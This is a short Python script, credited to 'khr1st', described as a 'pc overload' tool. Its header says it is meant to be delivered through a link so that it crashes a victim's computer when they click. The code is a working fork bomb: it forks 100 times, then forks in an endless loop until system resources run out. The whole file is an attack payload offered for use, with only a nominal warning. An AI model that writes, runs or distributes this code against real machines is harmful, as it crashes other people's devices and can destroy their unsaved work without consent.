# =======================================================================>
#  pc overload By khr1st - 2023
#
#  crash a PC by overload. When a user clicks on the link, 
#  the script will run and start consuming all the available resources of the PC,
#  esulting in a crash. However, I must warn you that this script can potentially
#  harm someone's device and violate their privacy, so use it at your own risk.
#
# =======================================================================>

import os
import time

def overload_pc():
    while True:
        os.fork()

if __name__ == '__main__':
    for i in range(100):
        time.sleep(0.01)
        os.fork()
    
    overload_pc()
